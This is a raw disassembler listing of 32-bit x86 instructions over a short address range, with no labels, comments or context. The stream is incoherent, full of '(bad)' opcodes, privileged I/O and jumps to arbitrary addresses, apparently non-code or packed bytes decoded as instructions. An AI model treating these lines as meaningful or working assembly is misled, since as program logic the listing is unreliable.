  41bf08:	pop    esi
  41bf09:	pop    esi
  41bf0a:	jp     0x41bee1
  41bf0c:	pop    edx
  41bf0d:	jae    0x41bee5
  41bf0f:	mov    esp,0x929c89f2
  41bf14:	stos   BYTE PTR es:[edi],al
  41bf15:	dec    ebx
  41bf16:	fidiv  WORD PTR [ebx+ecx*2+0x0]
  41bf1a:	jae    0x41bed4
  41bf1c:	mov    cl,0xf3
  41bf1e:	inc    eax
  41bf1f:	adc    DWORD PTR [esp+edi*1],esi
  41bf22:	mov    edi,0x408080c
  41bf27:	xor    al,0xc3
  41bf29:	fsubr  QWORD PTR [ecx+0x22]
  41bf2c:	mov    bl,cl
  41bf2e:	and    eax,0x973d0a74
  41bf33:	mov    al,0x32
  41bf35:	lds    esi,FWORD PTR [ebx]
  41bf37:	outs   dx,DWORD PTR ds:[esi]
  41bf38:	jae    0x41bfb1
  41bf3a:	pop    ebx
  41bf3b:	jae    0x41befb
  41bf3d:	stos   DWORD PTR es:[edi],eax
  41bf3e:	in     al,dx
  41bf3f:	mov    WORD PTR [edx],?
  41bf41:	in     eax,dx
  41bf42:	repz cs mov edi,0xc5f25711
  41bf49:	pop    eax
  41bf4a:	popf   
  41bf4b:	cmc    
  41bf4c:	xchg   ebx,eax
  41bf4d:	es push edi
  41bf4f:	rcr    dh,0x63
  41bf52:	mov    BYTE PTR [eax-0xe],cl
  41bf55:	sti    
  41bf56:	lock mov eax,0xcc41b321
  41bf5c:	arpl   WORD PTR [edi-0x4a],bp
  41bf5f:	add    ebx,DWORD PTR [ecx+0x5d]
  41bf62:	rol    DWORD PTR [ebp+0x75b684ce],1
  41bf68:	aas    
  41bf69:	push   esp
  41bf6a:	jle    0x41befa
  41bf6c:	adc    dh,BYTE PTR [edx]
  41bf6e:	aad    0xf3
  41bf70:	push   esp
  41bf71:	inc    edi
  41bf72:	and    dh,BYTE PTR [edi-0x4ba557a2]
  41bf78:	pop    ecx
  41bf79:	push   esp
  41bf7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf7b:	imul   edx,DWORD PTR [ecx],0xffffffe8
  41bf7e:	scas   eax,DWORD PTR es:[edi]
  41bf7f:	mov    eax,0xd135e569
  41bf84:	sub    eax,esi
  41bf86:	dec    ecx
  41bf87:	push   edi
  41bf88:	(bad)  
  41bf89:	pop    ecx
  41bf8a:	adc    eax,0xef4ff9eb
  41bf8f:	jg     0x41bf83
  41bf91:	out    dx,eax
  41bf92:	push   es
  41bf93:	into   
  41bf94:	dec    edi
  41bf95:	test   al,0x89
  41bf97:	xor    BYTE PTR [ecx],0x67
  41bf9a:	xor    esp,esp
  41bf9c:	jmp    0x9d65:0x94000b85
  41bfa3:	add    al,0xee
  41bfa5:	in     eax,0xee
  41bfa7:	outs   dx,DWORD PTR ds:[esi]
  41bfa8:	jecxz  0x41c00b
  41bfaa:	sbb    ebx,ebx
  41bfac:	mov    eax,0x9c301ba8
  41bfb1:	inc    esi
  41bfb2:	inc    esi
  41bfb3:	mov    ds:0xe62a7e68,eax
  41bfb8:	dec    edi
  41bfb9:	fs pushf 
  41bfbb:	aaa    
  41bfbc:	pop    ss
  41bfbd:	cld    
  41bfbe:	sub    dl,BYTE PTR [edx+0x53546ea1]
  41bfc4:	pop    esp
  41bfc5:	int    0xff
  41bfc7:	test   eax,0x5a15b3cd
  41bfcc:	not    DWORD PTR [ebp-0x2c]
  41bfcf:	in     al,0x44
  41bfd1:	mov    ebp,0x8c086544
  41bfd6:	dec    eax
  41bfd7:	fucomi st,st(7)
  41bfd9:	mov    dl,0x42
  41bfdb:	dec    ecx
  41bfdc:	xor    eax,ebp
  41bfde:	inc    esi
  41bfdf:	mov    edx,0x389ea4c2
  41bfe4:	push   ebp
  41bfe5:	jb     0x41bfee
  41bfe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfe8:	sbb    eax,0x1bd5713a
  41bfed:	inc    esp
  41bfee:	mov    esi,0xb03412a6
  41bff3:	loopne 0x41bfa6
  41bff5:	mov    esp,0x4d24749e
  41bffa:	inc    ebx
  41bffb:	cdq    
  41bffc:	sub    al,0x8d
  41bffe:	inc    eax
  41bfff:	lea    esi,[esi]
  41c001:	mov    BYTE PTR [ecx],dl
  41c003:	neg    DWORD PTR [esi+0x31995e3]
  41c009:	pop    ss
  41c00a:	xchg   ebx,eax
  41c00b:	jp     0x41bfcc
  41c00d:	test   al,0x2b
  41c00f:	sub    ch,BYTE PTR [eax]
  41c011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c012:	sub    ebp,DWORD PTR [ebx+edx*8+0x4cde066d]
  41c019:	sar    dl,1
  41c01b:	loopne 0x41c025
  41c01d:	cmp    eax,0xfc34422c
  41c022:	or     esp,ebx
  41c024:	or     ecx,DWORD PTR [eax-0x2c97840e]
  41c02a:	cmp    eax,DWORD PTR ss:[esi]
  41c02d:	cli    
  41c02e:	jge    0x41c09d
  41c030:	adc    DWORD PTR [ecx+0x73776169],ebx
  41c036:	and    al,0x72
  41c038:	add    eax,0x132fd6a0
  41c03d:	std    
  41c03e:	call   0xe90:0x965f9580
  41c045:	ins    DWORD PTR es:[edi],dx
  41c046:	adc    eax,0xe138ed1d
  41c04b:	je     0x41c090
  41c04d:	ret    0xec00
  41c050:	cli    
  41c051:	in     eax,dx
  41c052:	fiadd  DWORD PTR [esi]
  41c054:	js     0x41c02f
  41c056:	jmp    0xac6:0x5c85a88
  41c05d:	xchg   ah,ah
  41c05f:	fnstenv ds:[ebx]
  41c062:	jb     0x41c05b
  41c064:	mov    ebp,0xea5fc9e0
  41c069:	inc    edx
  41c06a:	ffreep st(3)
  41c06c:	push   esi
  41c06d:	jnp    0x41c08c
  41c06f:	add    dh,BYTE PTR [bp+di-0x5a]
  41c073:	push   0xffffff87
  41c075:	lds    ecx,FWORD PTR [edx+0x12]
  41c078:	fsin   
  41c07a:	iret   
  41c07b:	or     DWORD PTR ds:0x6919342d,0xc
  41c082:	mov    bh,ah
  41c084:	sub    BYTE PTR [edi+0x6a],bh
  41c087:	add    al,0xf1
  41c089:	mov    dh,0x61
  41c08b:	loopne 0x41c0ed
  41c08d:	sub    BYTE PTR [ebx],dl
  41c08f:	into   
  41c090:	ins    DWORD PTR es:[edi],dx
  41c091:	mov    ah,0xd8
  41c093:	and    al,0x8
  41c095:	adc    bl,BYTE PTR [ecx-0x4]
  41c098:	jecxz  0x41c09f
  41c09a:	cmp    eax,0xc3f218af
  41c09f:	jmp    0xbfe09f82
  41c0a4:	outs   dx,DWORD PTR ds:[esi]
  41c0a5:	mov    ds:0x2612f844,al
  41c0aa:	and    DWORD PTR [ebp-0x2b],0xa813f928
  41c0b1:	test   al,0xac
  41c0b3:	clc    
  41c0b4:	add    dh,BYTE PTR ds:0x6090ff3e
  41c0ba:	inc    eax
  41c0bb:	adc    al,0x8f
  41c0bd:	push   es
  41c0be:	popa   
  41c0bf:	lods   al,BYTE PTR ds:[esi]
  41c0c0:	sub    al,0xea
  41c0c2:	mov    bh,0x1b
  41c0c4:	ficom  DWORD PTR [ebx-0x2edb179b]
  41c0ca:	adc    edi,ebp
  41c0cc:	add    dh,BYTE PTR [ebx]
  41c0ce:	iret   
  41c0cf:	jecxz  0x41c0f8
  41c0d1:	xchg   esp,eax
  41c0d2:	mov    bl,0x19
  41c0d4:	jbe    0x41c107
  41c0d6:	pop    esi
  41c0d7:	call   0x7c6d47f0
  41c0dc:	cmp    DWORD PTR [ecx-0x54],edi
  41c0df:	pop    esi
  41c0e0:	mov    DWORD PTR [edx-0x1068009d],eax
  41c0e6:	inc    edx
  41c0e7:	adc    bl,cl
  41c0e9:	xchg   ebp,eax
  41c0ea:	int    0xa1
  41c0ec:	xchg   ebx,eax
  41c0ed:	(bad)
  41c0f2:	shr    BYTE PTR [bx+si-0x41],cl
  41c0f6:	out    0xbe,eax
  41c0f8:	outs   dx,DWORD PTR ds:[esi]
  41c0f9:	mov    edi,0xb8546562
  41c0fe:	mov    ebp,0x49d480b9
  41c103:	push   ebp
  41c104:	pop    edx
  41c105:	xchg   esp,eax
  41c106:	xor    cl,ah
  41c108:	mov    edx,0xd35f6835
  41c10d:	xor    esi,DWORD PTR ds:0x53e44036
  41c113:	in     eax,dx
  41c114:	push   ecx
  41c115:	pop    ds
  41c116:	sbb    al,BYTE PTR [eax]
  41c118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c119:	pop    es
  41c11a:	aam    0x7a
  41c11c:	push   es
  41c11d:	arpl   cx,ax
  41c11f:	push   ecx
  41c120:	xchg   ebp,eax
  41c121:	das    
  41c122:	jmp    0xdd9befdd
  41c127:	iret   
  41c128:	mov    cl,0xb2
  41c12a:	mov    dh,0x42
  41c12c:	arpl   WORD PTR [ecx-0x481a1fbe],si
  41c132:	mov    bh,0x21
  41c134:	mov    gs,WORD PTR [esi]
  41c136:	aad    0xa
  41c138:	aaa    
  41c139:	cmp    dl,BYTE PTR [ebx]
  41c13b:	loope  0x41c177
  41c13d:	lods   al,BYTE PTR ds:[esi]
  41c13e:	jl     0x41c109
  41c140:	int3   
  41c141:	sub    dh,cl
  41c143:	stos   DWORD PTR es:[edi],eax
  41c144:	mov    gs,WORD PTR [eax+0x2cfac1ee]
  41c14a:	push   ds
  41c14b:	xchg   BYTE PTR [esp+eiz*2-0x3e7ccc17],cl
  41c152:	fs popa 
  41c154:	lds    esp,FWORD PTR [esi-0x3fc9a2d7]
  41c15a:	cmp    bl,BYTE PTR [ebx+0x20]
  41c15d:	pushf  
  41c15e:	stc    
  41c15f:	test   eax,0xee7ed0ad
  41c164:	push   ecx
  41c165:	cmp    esi,edx
  41c167:	ror    DWORD PTR [edx+0x74ecd5ac],1
  41c16d:	xor    edi,ecx
  41c16f:	add    BYTE PTR [eax+0x44],al
  41c172:	and    ecx,esi
  41c174:	stc    
  41c175:	jae    0x41c1ca
  41c177:	sub    cl,BYTE PTR [edx+0x25]
  41c17a:	or     ch,dh
  41c17c:	sub    eax,0xadb5b134
  41c181:	cmp    cl,BYTE PTR ss:[ecx]
  41c184:	scas   eax,DWORD PTR es:[edi]
  41c185:	cmp    BYTE PTR [ebx+0x4],dl
  41c188:	ins    BYTE PTR es:[edi],dx
  41c189:	add    al,0xad
  41c18b:	push   0x40
  41c18d:	in     al,dx
  41c18e:	pop    edx
  41c18f:	push   0x5f
  41c191:	lds    esi,FWORD PTR [esi+0x11]
  41c194:	add    eax,0xe04e2003
  41c199:	sub    ch,BYTE PTR [edx-0x14]
  41c19c:	loopne 0x41c1d1
  41c19e:	pushf  
  41c19f:	aas    
  41c1a0:	jl     0x41c14e
  41c1a2:	adc    esp,DWORD PTR [ecx]
  41c1a4:	mov    BYTE PTR [edx],0x22
  41c1a7:	stos   BYTE PTR es:[edi],al
  41c1a8:	clc    
  41c1a9:	sub    bl,dh
  41c1ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1ac:	pop    ss
  41c1ad:	mov    al,ds:0x3debe325
  41c1b2:	add    dl,BYTE PTR [ecx]
  41c1b4:	clc    
  41c1b5:	mov    ch,0x5b
  41c1b7:	jl     0x41c139
  41c1b9:	fimul  DWORD PTR [eax-0x38319c93]
  41c1bf:	bound  ebp,QWORD PTR [edi-0x5b]
  41c1c2:	pusha  
  41c1c3:	(bad)  
  41c1c4:	fistp  DWORD PTR [esi]
  41c1c6:	into   
  41c1c7:	mov    dh,0x34
  41c1c9:	jno    0x41c1a5
  41c1cb:	pop    edx
  41c1cc:	sbb    al,0xbf
  41c1ce:	pop    ss
  41c1cf:	adc    ah,BYTE PTR [ecx+0x46bf5882]
  41c1d5:	and    ecx,edx
  41c1d7:	iret   
  41c1d8:	mov    DWORD PTR [ebp-0x14],ebp
  41c1db:	add    BYTE PTR [ecx],ch
  41c1dd:	mov    edx,0x30e763d0
  41c1e2:	jbe    0x41c188
  41c1e4:	sub    DWORD PTR [edi+0x4b],ecx
  41c1e7:	loop   0x41c22c
  41c1e9:	shl    DWORD PTR [eax],1
  41c1eb:	iret   
  41c1ec:	add    al,0x0
  41c1ee:	and    bh,dh
  41c1f0:	retfw  
  41c1f2:	nop
  41c1f3:	cli    
  41c1f4:	mov    al,0x2a
  41c1f6:	add    eax,0x3b7326b1
  41c1fb:	add    al,0x19
  41c1fd:	scas   eax,DWORD PTR es:[edi]
  41c1fe:	jno    0x41c1b5
  41c200:	popf   
  41c201:	jmp    0x41c1c0
  41c203:	push   0x52
  41c205:	jne    0x41c266
  41c207:	(bad)  
  41c208:	in     eax,0x16
  41c20a:	push   es
  41c20b:	or     eax,0x954d572c
  41c210:	inc    esp
  41c211:	add    eax,0xf8db0451
  41c216:	(bad)  
  41c217:	retf   0x6ae8
  41c21a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c21b:	out    0xca,al
  41c21d:	pop    edx
  41c21e:	int3   
  41c21f:	and    al,0xcb
  41c221:	xor    ch,BYTE PTR [ecx]
  41c223:	dec    ecx
  41c224:	inc    ecx
  41c225:	stos   BYTE PTR es:[edi],al
  41c226:	scas   al,BYTE PTR es:[edi]
  41c227:	mov    DWORD PTR [ebx-0xec3ab11],ecx
  41c22d:	or     eax,0xf508a685
  41c232:	aam    0x38
  41c234:	add    eax,DWORD PTR [ecx]
  41c236:	push   edx
  41c237:	cmp    al,0x97
  41c239:	outs   dx,DWORD PTR ds:[esi]
  41c23a:	lds    esi,FWORD PTR [esi]
  41c23c:	jle    0x41c20d
  41c23e:	or     al,0x58
  41c240:	dec    ecx
  41c241:	xchg   ebp,eax
  41c242:	test   edx,ebx
  41c244:	xor    al,0x7a
  41c246:	pop    esi
  41c247:	sar    DWORD PTR [ecx+0x24],cl
  41c24a:	jmp    0x41c210
  41c24c:	loope  0x41c1ea
  41c24e:	lods   eax,DWORD PTR ds:[esi]
  41c24f:	aad    0xdb
  41c251:	xchg   edx,eax
  41c252:	adc    eax,0xdafa2377
  41c257:	(bad)  
  41c258:	int    0x97
  41c25a:	inc    ebx
  41c25b:	dec    esp
  41c25c:	sahf   
  41c25d:	iret   
  41c25e:	push   eax
  41c25f:	cmp    DWORD PTR [esi],ebx
  41c261:	(bad)  
  41c262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c263:	(bad)  
  41c264:	repz mov edx,0x124cbbd6
  41c26a:	ja     0x41c2d4
  41c26c:	pop    eax
  41c26d:	pop    ss
  41c26e:	adc    bl,bl
  41c270:	xchg   ebx,eax
  41c271:	mov    BYTE PTR [eax-0x2b56b715],ah
  41c277:	pop    ebp
  41c278:	sbb    BYTE PTR [eax*2-0x10bdb02a],bh
  41c27f:	xor    ebp,DWORD PTR [ecx-0x2fa040ee]
  41c285:	imul   BYTE PTR [ecx+eiz*4-0x1c]
  41c289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c28a:	sar    ebx,0x0
  41c28d:	inc    ebp
  41c28e:	scas   al,BYTE PTR es:[edi]
  41c28f:	sbb    DWORD PTR [edx],edi
  41c291:	leave  
  41c292:	dec    ebp
  41c293:	pop    esp
  41c294:	sbb    esi,esp
  41c296:	popf   
  41c297:	sahf   
  41c298:	pop    es
  41c299:	dec    edx
  41c29a:	pop    edi
  41c29b:	mov    edi,DWORD PTR [ecx+0x63b1a1e4]
  41c2a1:	fisub  WORD PTR [esi+0x1418068e]
  41c2a7:	jne    0x41c24a
  41c2a9:	push   ecx
  41c2aa:	push   0x2d
  41c2ac:	imul   ecx,DWORD PTR [edx*4-0x4993290b],0x2d
  41c2b4:	and    BYTE PTR [eax-0x5ad50e77],dh
  41c2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2bb:	inc    ebx
  41c2bc:	mov    ebx,0x795c1355
  41c2c1:	push   ss
  41c2c2:	(bad)  
  41c2c3:	cwde   
  41c2c4:	pop    ds
  41c2c5:	mov    bh,0x71
  41c2c7:	out    0x16,al
  41c2c9:	ins    BYTE PTR es:[edi],dx
  41c2ca:	add    eax,DWORD PTR [ebp+0x462287a0]
  41c2d0:	inc    esi
  41c2d1:	ins    DWORD PTR es:[edi],dx
  41c2d2:	sti    
  41c2d3:	out    0x7e,al
  41c2d5:	stos   DWORD PTR es:[edi],eax
  41c2d6:	mov    WORD PTR [ebp+0x77],ss
  41c2d9:	sbb    ah,BYTE PTR [ecx]
  41c2db:	mov    bh,0x89
  41c2dd:	add    eax,0x4e12cb79
  41c2e2:	(bad)  [ebp+0x7]
  41c2e5:	test   al,0x5d
  41c2e7:	sbb    dl,BYTE PTR [eax+0x71ac8274]
  41c2ed:	cs dec ecx
  41c2ef:	or     dh,BYTE PTR [esi-0x1fc5e1f7]
  41c2f5:	fisttp WORD PTR [esi+0x48]
  41c2f8:	rcl    DWORD PTR [eax],1
  41c2fa:	mov    eax,ds:0x67f27fac
  41c2ff:	pop    edi
  41c300:	pop    edi
  41c301:	icebp  
  41c302:	and    eax,0x3f098bd2
  41c307:	jo     0x41c28b
  41c309:	retf   0xbc0
  41c30c:	xchg   BYTE PTR [ecx],dh
  41c30e:	xchg   ebx,eax
  41c30f:	push   eax
  41c310:	adc    al,0xbf
  41c312:	shl    DWORD PTR [esi+0x7ce3aeb4],0x23
  41c319:	jge    0x41c323
  41c31b:	loop   0x41c314
  41c31d:	lahf   
  41c31e:	xchg   ebp,eax
  41c31f:	jb     0x41c36c
  41c321:	aad    0x8d
  41c323:	call   0xecee2e42
  41c328:	pop    ss
  41c329:	xchg   esi,eax
  41c32a:	mov    ecx,DWORD PTR [ebx-0x6ff7a423]
  41c330:	(bad)  
  41c331:	jno    0x41c2c3
  41c333:	fwait
  41c334:	std    
  41c335:	repz stc 
  41c337:	add    bh,BYTE PTR ds:0x438961da
  41c33d:	inc    eax
  41c33e:	jbe    0x41c359
  41c340:	mov    ds:0xf2403758,eax
  41c345:	aam    0x14
  41c347:	jno    0x41c311
  41c349:	and    edi,DWORD PTR [edx-0x59]
  41c34c:	inc    ebx
  41c34d:	fadd   DWORD PTR [esi]
  41c34f:	cmp    DWORD PTR [ecx+0x19],ebx
  41c352:	cmp    DWORD PTR [edi-0x6f],ecx
  41c355:	push   cs
  41c356:	push   ss
  41c357:	inc    ecx
  41c358:	enter  0x5eee,0x9b
  41c35c:	and    al,0xa7
  41c35e:	aas    
  41c35f:	sbb    BYTE PTR [eax+esi*8-0x172c910e],al
  41c366:	scas   eax,DWORD PTR es:[edi]
  41c367:	mov    esp,0x970638ab
  41c36c:	test   DWORD PTR ds:0xfaa040fb,ebp
  41c372:	push   0x79
  41c374:	jns    0x41c2f9
  41c376:	mov    ah,0x1e
  41c378:	repz popf 
  41c37a:	push   es
  41c37b:	hlt    
  41c37c:	not    ebx
  41c37e:	jns    0x41c3ec
  41c380:	push   ecx
  41c381:	dec    ebx
  41c382:	xor    al,0x36
  41c384:	mov    dh,0xb9
  41c386:	mov    dl,0xcf
  41c388:	jecxz  0x41c3cf
  41c38a:	and    eax,DWORD PTR [esi+0x68]
  41c38d:	lea    ebp,[ebx-0x1a17daba]
  41c393:	xor    cl,BYTE PTR [eax]
  41c395:	push   ebx
  41c396:	pusha  
  41c397:	mov    ebp,0xb513a832
  41c39c:	xchg   ebp,eax
  41c39d:	hlt    
  41c39e:	jmp    0x41c36b
  41c3a0:	mov    al,0xd0
  41c3a2:	push   cs
  41c3a3:	fisubr DWORD PTR [ebp+0x54e0da36]
  41c3a9:	repnz pop esi
  41c3ab:	je     0x41c387
  41c3ad:	outs   dx,DWORD PTR ds:[esi]
  41c3ae:	xor    edx,edx
  41c3b0:	iret   
  41c3b1:	xor    DWORD PTR [ebx],0xd3356e24
  41c3b7:	stc    
  41c3b8:	dec    edx
  41c3b9:	not    BYTE PTR [edi]
  41c3bb:	xchg   edi,eax
  41c3bc:	or     DWORD PTR [ebx],edi
  41c3be:	pop    es
  41c3bf:	mov    ebx,0x8a8bf286
  41c3c4:	sub    dh,dh
  41c3c6:	ficomp WORD PTR [ecx+0x7ad3a214]
  41c3cc:	fs sahf 
  41c3ce:	xlat   BYTE PTR ds:[ebx]
  41c3cf:	sub    al,0x46
  41c3d1:	data16 adc BYTE PTR [ecx-0x2d],bl
  41c3d5:	adc    BYTE PTR [eax],ah
  41c3d7:	push   edx
  41c3d8:	ror    BYTE PTR [eax-0x4e],1
  41c3db:	sbb    ebp,ebx
  41c3dd:	loopne 0x41c3a8
  41c3df:	or     bl,ah
  41c3e1:	cmp    BYTE PTR ds:0x6ad57f1c,ch
  41c3e7:	mov    ah,BYTE PTR [eax]
  41c3e9:	cmp    al,0xfe
  41c3eb:	fisttp QWORD PTR [eax+0x59]
  41c3ee:	addr16 (bad) 
  41c3f0:	ins    DWORD PTR es:[edi],dx
  41c3f1:	mov    ds:0xbf8f9e3f,al
  41c3f6:	fwait
  41c3f7:	inc    BYTE PTR [esi-0x18]
  41c3fa:	fsub   QWORD PTR [ecx+0x60910216]
  41c400:	or     BYTE PTR [eax+0x0],0x86
  41c404:	push   ebx
  41c405:	mov    edx,DWORD PTR [ebx]
  41c407:	xlat   BYTE PTR ds:[ebx]
  41c408:	cmp    al,0x51
  41c40a:	scas   eax,DWORD PTR es:[edi]
  41c40b:	xor    ch,BYTE PTR [edx+0x2]
  41c40e:	mov    ebp,0x6b400f09
  41c413:	sbb    edx,DWORD PTR [edx+0x31d923f]
  41c419:	adc    eax,0x8b432cb1
  41c41e:	pop    ebx
  41c41f:	lods   eax,DWORD PTR ds:[esi]
  41c420:	lahf   
  41c421:	cmp    dl,BYTE PTR [edi]
  41c423:	pop    ecx
  41c424:	mov    edx,0xccb14b5d
  41c429:	out    0x6d,eax
  41c42b:	or     dl,BYTE PTR [eax+0x1d]
  41c42e:	stos   BYTE PTR es:[edi],al
  41c42f:	test   DWORD PTR [edx+0x42],ebx
  41c432:	sbb    al,0xe0
  41c434:	cmp    al,0x9f
  41c436:	mov    esi,0xa785b944
  41c43b:	xchg   esi,eax
  41c43c:	mov    dl,0x9
  41c43e:	pop    es
  41c43f:	jo     0x41c479
  41c441:	or     ebx,eax
  41c443:	call   DWORD PTR [ebx-0x786367c5]
  41c449:	push   edx
  41c44a:	out    dx,al
  41c44b:	pop    edx
  41c44c:	xor    DWORD PTR [ecx+0x55],ebx
  41c44f:	addr16 pop ebx
  41c451:	add    edi,ebx
  41c453:	push   edx
  41c454:	add    DWORD PTR [edi+0x160c38f5],0x5a28876a
  41c45e:	fst    QWORD PTR [eax]
  41c460:	inc    edx
  41c461:	lods   eax,DWORD PTR ds:[esi]
  41c462:	ja     0x41c3f1
  41c464:	mov    WORD PTR [eax],es
  41c466:	or     eax,DWORD PTR [ecx-0x2a]
  41c469:	ins    BYTE PTR es:[edi],dx
  41c46a:	jbe    0x41c41f
  41c46c:	sub    al,0x47
  41c46e:	jmp    0xfc1b:0x8d3d7b97
  41c475:	mov    cl,0x5a
  41c477:	es sahf 
  41c479:	sbb    edi,ebp
  41c47b:	outs   dx,DWORD PTR ds:[esi]
  41c47c:	and    esi,DWORD PTR [ecx]
  41c47e:	mov    al,ds:0xeefa994d
  41c483:	popf   
  41c484:	dec    ecx
  41c485:	mov    eax,0x610c9818
  41c48a:	call   0x35a4:0xf3630f23
  41c491:	cwde   
  41c492:	(bad)  
  41c494:	sbb    esi,ebx
  41c496:	mov    ebx,0x6740a850
  41c49b:	mov    cs,WORD PTR [edi+0x84dce2b]
  41c4a1:	rcr    eax,cl
  41c4a3:	inc    edi
  41c4a4:	dec    edx
  41c4a6:	fdivr  st,st(1)
  41c4a8:	xchg   edi,eax
  41c4a9:	mov    esi,0x62baa705
  41c4ae:	push   edi
  41c4af:	es adc cl,dl
  41c4b2:	mov    esp,0x737ad030
  41c4b7:	mov    edx,0x70a12cf0
  41c4bc:	(bad)  
  41c4bd:	xchg   ecx,eax
  41c4be:	mov    ?,ebp
  41c4c0:	or     eax,0xb0882228
  41c4c5:	adc    BYTE PTR [bp+di],0x13
  41c4c9:	mov    esp,0x7fdc2c6e
  41c4ce:	dec    edi
  41c4cf:	jmp    0xda40c7b6
  41c4d4:	mov    eax,ds:0x6363adb8
  41c4d9:	(bad)  
  41c4da:	cld    
  41c4db:	retf   
  41c4dc:	xchg   ecx,eax
  41c4dd:	stos   DWORD PTR es:[edi],eax
  41c4de:	mov    eax,0x56cc740b
  41c4e3:	sbb    DWORD PTR [eax+0x18],esi
  41c4e6:	inc    esp
  41c4e7:	xor    bh,ch
  41c4e9:	das    
  41c4ea:	jge    0x41c560
  41c4ec:	daa    
  41c4ed:	in     al,0x49
  41c4ef:	dec    ebx
  41c4f0:	sbb    eax,0x7587c7f0
  41c4f5:	dec    esi
  41c4f6:	dec    esi
  41c4f7:	push   edx
  41c4f8:	push   ecx
  41c4f9:	jmp    0xfae0c4b4
  41c4fe:	and    bl,BYTE PTR [edx-0x7a207974]
  41c504:	cmp    eax,0xddc7f61b
  41c509:	in     eax,dx
  41c50a:	sahf   
  41c50b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c50c:	push   ds
  41c50d:	mov    dh,0xaf
  41c50f:	stos   BYTE PTR es:[edi],al
  41c510:	loope  0x41c4a6
  41c512:	push   esi
  41c513:	mov    ebx,0x1fa4df8f
  41c518:	push   edi
  41c519:	aaa    
  41c51a:	xor    eax,0x7511233e
  41c51f:	aas    
  41c520:	add    DWORD PTR [edx+0x3a47c5c8],esp
  41c526:	or     dh,dl
  41c528:	push   ds
  41c529:	popf   
  41c52a:	jg     0x41c5a9
  41c52c:	scas   eax,DWORD PTR es:[edi]
  41c52d:	aam    0x9d
  41c52f:	aad    0x23
  41c531:	adc    DWORD PTR [esi+0x2d],esp
  41c534:	xchg   esi,eax
  41c535:	mov    ds:0xea94d733,eax
  41c53a:	aad    0xbc
  41c53c:	sbb    BYTE PTR [edx],0x49
  41c53f:	xor    al,0xf
  41c541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c543:	sti    
  41c544:	in     eax,0x36
  41c546:	aad    0x36
  41c548:	fsub   st,st(0)
  41c54a:	mov    edx,0xf2ade3f8
  41c54f:	ret    
  41c550:	or     BYTE PTR [eiz*1+0x13bcda01],0x66
  41c558:	ins    DWORD PTR es:[edi],dx
  41c559:	ret    0x11fc
  41c55c:	dec    esp
  41c55d:	mov    ah,0xb8
  41c55f:	fwait
  41c560:	call   0xb669ea9d
  41c565:	sub    eax,0x9c5784a6
  41c56a:	jecxz  0x41c54d
  41c56c:	pop    edi
  41c56d:	out    0x63,al
  41c56f:	sbb    BYTE PTR ds:[ecx-0x68],ch
  41c573:	pop    ss
  41c574:	int3   
  41c575:	mov    cl,0x3b
  41c577:	jmp    0x41c57f
  41c579:	in     eax,0x6a
  41c57b:	repnz cmc 
  41c57d:	lea    esi,[edx-0x1006b5bd]
  41c583:	cmp    DWORD PTR [ebx-0x11620f46],edx
  41c589:	lock xchg edi,eax
  41c58b:	cwde   
  41c58c:	pop    ecx
  41c58d:	pop    ds
  41c58e:	jo     0x41c5a9
  41c590:	add    al,0xbd
  41c592:	xor    dl,al
  41c594:	or     al,0x40
  41c596:	dec    eax
  41c597:	sub    ebp,DWORD PTR ds:0x595cb498
  41c59d:	jb     0x41c5c0
  41c59f:	fcomi  st,st(5)
  41c5a1:	add    BYTE PTR [edi+ebx*1+0x2],dh
  41c5a5:	and    al,0x2
  41c5a7:	sub    eax,0x7c312c53
  41c5ac:	sub    BYTE PTR [ecx+0x7],dh
  41c5af:	mov    eax,ds:0x8fd4c287
  41c5b4:	mov    bh,0x28
  41c5b6:	mov    eax,ds:0x174856e3
  41c5bb:	sub    eax,0xc09ee0b2
  41c5c0:	jmp    0x85a90556
  41c5c5:	retf   0xfad8
  41c5c8:	xor    ecx,DWORD PTR [esi]
  41c5ca:	xchg   DWORD PTR [ecx+ecx*1+0x1b1ed237],edi
  41c5d1:	aas    
  41c5d2:	outs   dx,BYTE PTR ds:[esi]
  41c5d3:	retf   0xabd0
  41c5d6:	jmp    0x41c57c
  41c5d8:	jmp    0x41c645
  41c5da:	xor    DWORD PTR [eax+0x2d6a7b74],esp
  41c5e0:	push   ss
  41c5e1:	fcomp  DWORD PTR [ebx]
  41c5e3:	out    dx,al
  41c5e4:	cld    
  41c5e5:	push   cs
  41c5e6:	xchg   ecx,eax
  41c5e7:	ins    BYTE PTR es:[edi],dx
  41c5e8:	mov    DWORD PTR [eax+edx*8-0x22f07c15],eax
  41c5ef:	out    0x3e,eax
  41c5f1:	mov    edx,0x37b9ae21
  41c5f6:	xchg   edx,eax
  41c5f7:	iret   
  41c5f8:	mov    cs,WORD PTR [edx]
  41c5fa:	retf   0x73
  41c5fd:	dec    edi
  41c5fe:	lods   eax,DWORD PTR ds:[esi]
  41c5ff:	sub    ah,BYTE PTR gs:[esi+0x45]
  41c603:	stc    
  41c604:	pop    esi
  41c605:	pop    es
  41c606:	mov    ecx,0x66ef12a9
  41c60b:	and    ebx,ebp
  41c60d:	ret    0x9e4
  41c610:	mov    bl,0x66
  41c612:	fsub   DWORD PTR [ecx-0x4421872c]
  41c618:	cmc    
  41c619:	inc    edx
  41c61a:	inc    eax
  41c61b:	int    0x54
  41c61d:	jne    0x41c5ce
  41c61f:	jae    0x41c62e
  41c621:	sub    BYTE PTR ds:0x6ff31d6c,bh
  41c627:	add    ebp,ecx
  41c629:	lea    edx,[ebx]
  41c62b:	cli    
  41c62c:	sbb    eax,0x470be5c0
  41c631:	xchg   ebp,edi
  41c633:	fbld   TBYTE PTR [eax]
  41c635:	or     DWORD PTR [edi+ebp*2+0x11fa9c80],ecx
  41c63c:	add    bh,cl
  41c63e:	mov    dh,0x2d
  41c640:	fistp  DWORD PTR ds:0xe5037f9f
